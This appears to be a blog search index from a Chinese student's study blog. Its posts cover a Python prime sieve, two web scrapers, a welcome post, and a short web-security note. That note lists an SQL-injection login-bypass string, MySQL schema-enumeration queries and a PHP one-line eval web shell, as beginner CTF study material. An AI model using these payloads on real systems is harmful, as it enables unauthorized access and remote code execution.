<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[用python实现埃氏筛]]></title>
    <url>%2F2018%2F10%2F27%2F%E7%94%A8python%E5%AE%9E%E7%8E%B0%E5%9F%83%E6%B0%8F%E7%AD%9B%2F</url>
    <content type="text"><![CDATA[昨天实验课上，当我判断质数还在用取模方法的时候，打ACM的大佬刁老板对我说出埃氏筛，随后回到宿舍开始查，到现在整理完思路已经凌晨1点，在瑟瑟发抖中写下这篇博客。 埃拉托斯特尼筛法，简称埃氏筛或爱氏筛，是一种由希腊数学家埃拉托斯特尼所提出的一种简单检定素数的算法。要得到自然数n以内的全部素数，必须把不大于根号n的所有素数的倍数剔除，剩下的就是素数。下面用python实现12345678910111213141516171819202122232425262728def JudgePrimes(n): primes = [] f = [] for i in range(n+1):#这样写，可以把自然数和列表元素的序号对应起来。 if i &gt; 2 and i%2 == 0:#把从0到n的偶数筛掉。 f.append(0) else: f.append(1) i = 3 while i*i &lt;= n: #把不大于根号n的所有质数的倍数剔除,剩下的就是质数 if f[i] == 1:#判断是不是质数，若是质数，则筛掉其倍数 j = 2*i while j&lt;=n:#把小于n的所有质数的倍数都筛掉 f[j] = 0 j += i i += 2 primes.append(2)#2是质数 for x in range(3,n+1): if f[x] == 1: primes.append(x) return primes n = int(input("请输入大于1的正整数n："))primes = JudgePrimes(n)print (primes) 算法可以进一步优化123456789101112131415161718192021222324252627def JudgePrimes(n): primes = [] f = [] for i in range(n+1): if i &gt; 2 and i%2 == 0: f.append(0) else: f.append(1) i = 3 while i*i &lt;= n: #把不大于根号n的所有质数的倍数剔除,剩下的就是质数 if f[i] == 1:#判断是不是质数，若是质数，则筛掉其倍数 j = i*i #直接从质数的平方后开始筛，因为质数的平方之前的数已经被上一个质数筛过了，此时j为奇数 while j &lt;= n: f[j] = 0 j += 2*i #如果只加一个i,j则为i的偶数倍是一个偶数已经被筛过了，所以加2个i筛掉i的奇数倍，小优化。 i += 2 primes.append(2)#2是质数 for x in range(3,n+1,2):#步长为2，把偶数跳过,小优化。 if f[x] == 1: primes.append(x) return primes n = int(input("请输入大于1的正整数n："))primes = JudgePrimes(n)print (primes)]]></content>
      <categories>
        <category>python学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬取猫眼电影top100]]></title>
    <url>%2F2018%2F10%2F26%2F%E7%88%AC%E5%8F%96%E7%8C%AB%E7%9C%BC%E7%94%B5%E5%BD%B1top100%2F</url>
    <content type="text"><![CDATA[昨天学了正则，有点膨胀，来爬爬猫眼电影top100试试看。http://maoyan.com/board/4 用到的模块12import requestsimport re 用正则表达式匹配下载当页信息首先打开网页，右键霸王别姬检查元素，可以发现我们要提取的信息。接下来就是写代码用正则把内匹配下来12345678910111213headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4094.1 Safari/537.36'&#125;r = requests.get('http://maoyan.com/board/4?offset=0',headers=headers)results = re.findall( '&lt;a.*?title="(.*?)".*?class="image-link".*?class="star"&gt;(.*?)&lt;/p&gt;.*?&lt;p class="releasetime"&gt;(.*?)&lt;/p&gt;.*?&lt;i class="integer"&gt;(.*?)&lt;/i&gt;&lt;i class="fraction"&gt;(.*?)&lt;/i&gt;&lt;/p&gt; ', r.text, re.S)'''findall方法会把匹配到的小括号里的一组内容加工成元组，再把所有元组以列表形式返回.*?可以非贪婪匹配任意除换行字符，只要把想提取的内容以.*?代替就好了，再加个小括号我们只需要写要提取的内容前面和后面的几个字符就好了，其他的冗长字符也可用.*?代替第二个参数是被匹配的文本，传入网页源代码即可因为标签之间还有好多换行，而.*?无法匹配换行，加上re.S这个参数，就可以匹配到了''' 再写个循环把提取到的内容写进txt文件即可123456789for i in results: with open('top100.txt', 'a',encoding='utf-8') as f: f.write(i[0] + ' ' + re.sub('\n\s+', '', str(i[1])) + ' ' + i[2] + ' ' + '评分：' + i[3] + i[4] + '\n')'''a表示追加写入，要加上encoding='utf-8'，不然会编码错误i[0] i[1]等表示当前列表里的某个元组的第几个内容我们会发现元组里的第二个内容有许多空格和换行，所以我们用sub方法拿''空字符替换掉，第一个参数是被替换字符，第二个参数是替换字符，第三个参数是被操作的文本，所以我们需要把元组的内容转换成字符串。''' 写个循环爬取所有页面的内容我们发现网页的地址格式是http://maoyan.com/board/4?offset= + 0,10,20,30…10012345for i in range(0,110,10): url = 'http://maoyan.com/board/4?offset=' + str(i)'''第三个参数是步长，即每次增加10，因为range里的两个数字是前闭后开，所以第二个参数要比100大，这样我们就得到0,10,20到100的数然后再把上面的代码写成函数，在这个循环里调用即可''' 这次我终于用上函数了附上全部代码,原谅小白的代码吧。12345678910111213141516import requestsimport redef get_information(url): headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4094.1 Safari/537.36'&#125; r = requests.get(url,headers=headers) result = re.findall( '&lt;a.*?title="(.*?)".*?class="image-link".*?class="star"&gt;(.*?)&lt;/p&gt;.*?&lt;p class="releasetime"&gt;(.*?)&lt;/p&gt;.*?&lt;i class="integer"&gt;(.*?)&lt;/i&gt;&lt;i class="fraction"&gt;(.*?)&lt;/i&gt;&lt;/p&gt; ', r.text, re.S) for i in result: with open('top100.txt', 'a',encoding='utf-8') as f: f.write(i[0] + ' ' + re.sub('\n\s+', '', str(i[1])) + ' ' + i[2] + ' ' + '评分：' + i[3] + i[4] + '\n')for i in range(0,110,10): url = 'http://maoyan.com/board/4?offset=' + str(i) get_information(url)]]></content>
      <categories>
        <category>python学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[初学python爬虫]]></title>
    <url>%2F2018%2F10%2F22%2F%E8%8F%9C%E9%B8%9F%E5%88%9D%E5%AD%A6python%E7%88%AC%E8%99%AB%2F</url>
    <content type="text"><![CDATA[菜鸟初学python爬虫，爬一个没有反爬的炒鸡简单的网站。http://www.mzitu.com/zipai/ 用到的模块123import requestsfrom bs4 import BeautifulSoupimport os 找到当前页面图片地址首先打开网站，右键图片点击检查，发现图片地址在p标签下的img标签中储存。先用get方法获取页面内容，再用BeautifulSoup煲汤。1234r = requests.get('http://www.mzitu.com/zipai/')soup = BeautifulSoup(r.text,'lxml') #需要 pip install lxmllist1 = []list1 = soup.select('p &gt; img') 然后再用for循环提取出img的属性1234list2 =[]for i in list1: list2.append(i.get('src')) print(i.get('src')) 下载图片12345678os.mkdir('D:/妹子图')os.chdir('D:/妹子图')for i in list2: img = requests.get(i) filename = i.split('/')[-1] with open(filename,'wb') as f: f.write(img.content) 循环每个页面很容易可以观察到，地址的格式是”http://www.mzitu.com/zipai/comment-page-&quot;+ 页数+”/#comments”因此写个for循环即可遍历地址12for i in range(1,365): url ="http://www.mzitu.com/zipai/comment-page-"+ str(i)+"/#comments" 再把url传入上面的方法即可。 小问题因为本人是单身狗，怠惰于面向对象编程，所以代码被我写在一团，实际可以定义几个函数，提升代码的可读性和美观性。下面贴上完整代码，大佬勿喷，哈哈。1234567891011121314151617181920import requestsfrom bs4 import BeautifulSoupimport osos.mkdir('D:/妹子图')os.chdir('D:/妹子图')for i in range(1,365): url ="http://www.mzitu.com/zipai/comment-page-"+ str(i)+"/#comments" r = requests.get(url) soup = BeautifulSoup(r.text,'lxml') list1 = soup.select('p &gt; img') list2 =[] for i in list1: list2.append(i.get('src')) print(i.get('src')) for i in list2: img = requests.get(i) filename = i.split('/')[-1] with open(filename,'wb') as f: f.write(img.content)]]></content>
      <categories>
        <category>python学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[菜鸟初学web]]></title>
    <url>%2F2018%2F10%2F19%2F%E8%8F%9C%E9%B8%9F%E5%88%9D%E5%AD%A6web%2F</url>
    <content type="text"><![CDATA[密码绕过漏洞:11' or 1=1 '1 mysql手工注入:123select table_name from information_schema.tables where table_schema="";select column_name from information_schema.columns where table_name=""; php一句话木马:123&lt;?php @eval($_POST[ 'pass' ]);?&gt;"?&gt;&lt;?php @eval($_POST[ 'pass' ]);?&gt;&lt;?php#]]></content>
      <categories>
        <category>web安全学习笔记</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>sql漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Welcome to my blog.]]></title>
    <url>%2F2018%2F10%2F18%2FMy%20first%20blog%2F</url>
    <content type="text"><![CDATA[学校里全是dalao，加油鸭！一定要成为一名牛逼的CTFer！不负自己，未来可期！]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
</search>
